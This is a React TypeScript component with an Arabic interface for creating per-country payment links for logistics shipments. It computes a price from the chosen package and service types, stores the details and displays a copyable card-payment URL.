import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyCode, getCurrencySymbol } from "@/lib/countryCurrencies";
import { useCreateLink } from "@/hooks/useSupabase";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { Truck, Copy, Check, ArrowRight } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import BottomNav from "@/components/BottomNav";
import BackButton from "@/components/BackButton";

const CreateLogisticsLink = () => {
  const { country } = useParams<{ country: string }>();
  const navigate = useNavigate();
  const { toast } = useToast();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  
  const createLink = useCreateLink();
  
  const [packageType, setPackageType] = useState<string>("");
  const [serviceType, setServiceType] = useState<string>("");
  const [senderName, setSenderName] = useState<string>("");
  const [receiverName, setReceiverName] = useState<string>("");
  const [shipmentAmount, setShipmentAmount] = useState<number>(0);
  const [createdLink, setCreatedLink] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  
  const packageTypes = [
    { value: "documents", label: "وثائق ومستندات", icon: "📄", basePrice: 50 },
    { value: "electronics", label: "أجهزة إلكترونية", icon: "💻", basePrice: 150 },
    { value: "clothing", label: "ملابس وأزياء", icon: "👕", basePrice: 80 },
    { value: "food", label: "مواد غذائية", icon: "🍎", basePrice: 100 },
    { value: "furniture", label: "أثاث منزلي", icon: "🪑", basePrice: 300 },
    { value: "medical", label: "أدوية ومستلزمات طبية", icon: "💊", basePrice: 120 },
    { value: "automotive", label: "قطع غيار سيارات", icon: "🚗", basePrice: 200 },
    { value: "industrial", label: "مواد صناعية", icon: "⚙️", basePrice: 250 },
    { value: "other", label: "أخرى", icon: "📦", basePrice: 100 },
  ];

  const serviceTypes = [
    { value: "express", label: "توصيل سريع (24-48 ساعة)", icon: "⚡", multiplier: 2.0 },
    { value: "standard", label: "توصيل قياسي (3-5 أيام)", icon: "📦", multiplier: 1.0 },
    { value: "economy", label: "توصيل اقتصادي (5-7 أيام)", icon: "💰", multiplier: 0.7 },
    { value: "same_day", label: "توصيل نفس اليوم", icon: "🚀", multiplier: 3.0 },
  ];

  const selectedPackageType = packageTypes.find(p => p.value === packageType);
  const selectedServiceType = serviceTypes.find(s => s.value === serviceType);
  
  const handlePackageTypeChange = (value: string) => {
    setPackageType(value);
    const pkg = packageTypes.find(p => p.value === value);
    const svc = serviceTypes.find(s => s.value === serviceType);
    if (pkg && svc) {
      setShipmentAmount(Math.round(pkg.basePrice * svc.multiplier));
    } else if (pkg) {
      setShipmentAmount(pkg.basePrice);
    }
  };

  const handleServiceTypeChange = (value: string) => {
    setServiceType(value);
    const svc = serviceTypes.find(s => s.value === value);
    const pkg = packageTypes.find(p => p.value === packageType);
    if (pkg && svc) {
      setShipmentAmount(Math.round(pkg.basePrice * svc.multiplier));
    }
  };
  
  const handleCreate = async () => {
    if (!countryData || !packageType || !serviceType) {
      toast({
        title: "خطأ",
        description: "الرجاء تعبئة جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }

    const payload = {
      package_type: packageType,
      package_type_label: selectedPackageType?.label || '',
      package_type_icon: selectedPackageType?.icon || '',
      service_type: serviceType,
      service_type_label: selectedServiceType?.label || '',
      service_type_icon: selectedServiceType?.icon || '',
      sender_name: senderName,
      receiver_name: receiverName,
      payment_amount: shipmentAmount,
      currency_code: getCurrencyCode(country || "SA"),
      payment_method: "card",
      selectedCountry: country || "SA",
    };

    try {
      const link = await createLink.mutateAsync({
        type: "logistics",
        country_code: country!,
        payload,
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: "logistics",
        country: country || 'SA',
        amount: shipmentAmount,
        currency: getCurrencyCode(country || "SA"),
        paymentMethod: "card",
      });

      setCreatedLink(paymentUrl);
      
      toast({
        title: "تم إنشاء رابط الدفع بنجاح!",
        description: "يمكنك الآن مشاركة الرابط للدفع",
      });
    } catch (error) {
      toast({
        title: "خطأ في إنشاء الرابط",
        description: "حدث خطأ أثناء إنشاء رابط الدفع. الرجاء المحاولة مرة أخرى",
        variant: "destructive",
      });
    }
  };
  
  const handleCopy = () => {
    if (createdLink) {
      navigator.clipboard.writeText(createdLink);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
      toast({
        title: "تم النسخ!",
        description: "تم نسخ الرابط إلى الحافظة",
      });
    }
  };
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Truck className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  if (createdLink) {
    return (
      <div className="min-h-screen py-6" dir="rtl">
        <div className="container mx-auto px-4">
          <Card className="max-w-xl mx-auto p-4 text-center">
            <div className="w-14 h-14 bg-gradient-success rounded-full flex items-center justify-center mx-auto mb-3">
              <Check className="w-7 h-7 text-white" />
            </div>
            
            <h2 className="text-xl font-bold mb-2">تم إنشاء رابط الدفع بنجاح!</h2>
            <p className="text-sm text-muted-foreground mb-4">
              شارك هذا الرابط للدفع وتأكيد الشحنة
            </p>

            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2 text-right">
              <div className="flex items-center justify-between text-sm">
                <span className="font-semibold">{selectedPackageType?.label}</span>
                <span className="text-muted-foreground">نوع الشحنة:</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="font-semibold">{selectedServiceType?.label}</span>
                <span className="text-muted-foreground">نوع الخدمة:</span>
              </div>
              {senderName && (
                <div className="flex items-center justify-between text-sm">
                  <span className="font-semibold">{senderName}</span>
                  <span className="text-muted-foreground">المرسل:</span>
                </div>
              )}
              {receiverName && (
                <div className="flex items-center justify-between text-sm">
                  <span className="font-semibold">{receiverName}</span>
                  <span className="text-muted-foreground">المستلم:</span>
                </div>
              )}
              <div className="flex items-center justify-between text-sm pt-2 border-t border-border/50">
                <span className="font-bold text-lg">
                  {formatCurrency(shipmentAmount, getCurrencyCode(country || "SA"))}
                </span>
                <span className="text-muted-foreground">المبلغ:</span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-4 break-all">
              <code className="text-xs">{createdLink}</code>
            </div>

            <div className="flex gap-3 justify-center">
              <Button onClick={handleCopy}>
                {copied ? (
                  <>
                    <Check className="w-4 h-4 ml-2" />
                    <span className="text-sm">تم النسخ</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    <span className="text-sm">نسخ الرابط</span>
                  </>
                )}
              </Button>

              <Button
                variant="outline"
                onClick={() => window.open(createdLink, "_blank")}
              >
                <span className="ml-2 text-sm">عرض المعاينة</span>
                <ArrowRight className="w-4 h-4 mr-2" />
              </Button>
            </div>
            
            <Button
              variant="ghost"
              className="mt-4 text-sm"
              onClick={() => navigate("/services")}
            >
              إنشاء رابط جديد
            </Button>
          </Card>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen py-6" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="mb-4">
          <BackButton />
        </div>
        <div className="max-w-2xl mx-auto">
          <div className="mb-4">
            <div className="flex items-center gap-2 mb-3">
              <div
                className="w-10 h-10 rounded-lg flex items-center justify-center"
                style={{
                  background: `linear-gradient(135deg, #7C3AED, #A78BFA)`,
                }}
              >
                <Truck className="w-5 h-5 text-white" />
              </div>
              <div>
                <h1 className="text-xl font-bold">الخدمات اللوجستية - {countryData.nameAr}</h1>
                <p className="text-xs text-muted-foreground">أنشئ رابط دفع لشحنة</p>
              </div>
            </div>
          </div>
          
          <Card className="p-4">
            <div className="space-y-4">
              <div>
                <Label className="text-sm mb-2">نوع الشحنة *</Label>
                <Select value={packageType} onValueChange={handlePackageTypeChange}>
                  <SelectTrigger className="w-full h-10">
                    <SelectValue placeholder="اختر نوع الشحنة..." />
                  </SelectTrigger>
                  <SelectContent>
                    {packageTypes.map((type) => (
                      <SelectItem key={type.value} value={type.value}>
                        <div className="flex items-center gap-2">
                          <span>{type.icon}</span>
                          <span className="text-sm">{type.label}</span>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              {packageType && (
                <>
                  <div>
                    <Label className="text-sm mb-2">نوع الخدمة *</Label>
                    <Select value={serviceType} onValueChange={handleServiceTypeChange}>
                      <SelectTrigger className="w-full h-10">
                        <SelectValue placeholder="اختر نوع الخدمة..." />
                      </SelectTrigger>
                      <SelectContent>
                        {serviceTypes.map((type) => (
                          <SelectItem key={type.value} value={type.value}>
                            <div className="flex items-center gap-2">
                              <span>{type.icon}</span>
                              <span className="text-sm">{type.label}</span>
                            </div>
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <Label className="text-sm mb-2">
                      اسم المرسل (اختياري)
                    </Label>
                    <Input
                      type="text"
                      value={senderName}
                      onChange={(e) => setSenderName(e.target.value)}
                      placeholder="أدخل اسم المرسل..."
                      className="h-9 text-sm"
                    />
                  </div>
                  
                  <div>
                    <Label className="text-sm mb-2">
                      اسم المستلم (اختياري)
                    </Label>
                    <Input
                      type="text"
                      value={receiverName}
                      onChange={(e) => setReceiverName(e.target.value)}
                      placeholder="أدخل اسم المستلم..."
                      className="h-9 text-sm"
                    />
                  </div>
                  
                  <div>
                    <Label className="text-sm mb-2">
                      مبلغ الشحن ({getCurrencySymbol(country || "SA")})
                    </Label>
                    <Input
                      type="number"
                      value={shipmentAmount}
                      onChange={(e) => setShipmentAmount(Number(e.target.value))}
                      className="h-9 text-sm"
                      min="0"
                      step="0.01"
                    />
                    <p className="text-xs text-muted-foreground mt-1">
                      💡 السعر المحسوب تلقائياً بناءً على النوع والخدمة
                    </p>
                  </div>
                  
                  <div className="bg-gradient-to-r from-purple-500 to-indigo-500 p-4 rounded-xl text-white">
                    <p className="text-xs mb-1">المبلغ الإجمالي</p>
                    <p className="text-2xl font-bold">
                      {formatCurrency(shipmentAmount, getCurrencyCode(country || "SA"))}
                    </p>
                  </div>
                  
                  <Button
                    onClick={handleCreate}
                    disabled={createLink.isPending}
                    className="w-full py-5"
                  >
                    {createLink.isPending ? (
                      <span className="text-sm">جاري الإنشاء...</span>
                    ) : (
                      <>
                        <span className="ml-2 text-sm">إنشاء رابط الدفع</span>
                        <ArrowRight className="w-4 h-4 mr-2" />
                      </>
                    )}
                  </Button>
                </>
              )}
            </div>
          </Card>
        </div>
      </div>
      <div className="h-20" />
      <BottomNav />
    </div>
  );
};

export default CreateLogisticsLink;
